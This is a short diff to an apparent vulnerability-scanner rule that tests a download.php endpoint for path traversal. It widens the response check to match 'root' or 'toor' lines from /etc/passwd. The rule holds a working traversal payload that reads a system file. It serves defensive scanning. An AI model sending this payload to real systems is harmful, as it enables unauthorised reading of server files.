@@ -4,7 +4,7 @@ rules:
     path: /download.php?file=../../../../../etc/passwd
     follow_redirects: false
     expression: |
-      response.status == 200 && "toor:[x*]:0:0:".bmatches(response.body)
+      response.status == 200 && "(root|toor):[x*]:0:0:".bmatches(response.body)
 
 detail:
   author: Print1n(http://print1n.top)
